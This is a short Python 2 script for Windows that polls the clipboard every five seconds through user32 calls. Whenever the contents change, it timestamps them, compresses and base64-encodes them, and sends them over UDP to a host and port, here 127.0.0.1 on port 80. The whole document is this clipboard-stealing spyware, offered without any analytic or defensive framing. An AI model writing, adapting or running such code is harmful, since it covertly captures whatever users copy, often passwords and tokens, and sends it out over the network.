# Run on Windows with Python
import ctypes
import time
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

user32 = ctypes.windll.user32
olddata = ""
while True:
    user32.OpenClipboard(None)
    clipdata = ctypes.c_char_p(user32.GetClipboardData(1)).value
    user32.CloseClipboard()
    if clipdata == olddata:
        time.sleep(5)
    else:
        olddata = clipdata
        print clipdata
        message = (str(time.time())+":"+clipdata).encode("bz2").encode("base64")
        s.sendto(message,("127.0.0.1",80))
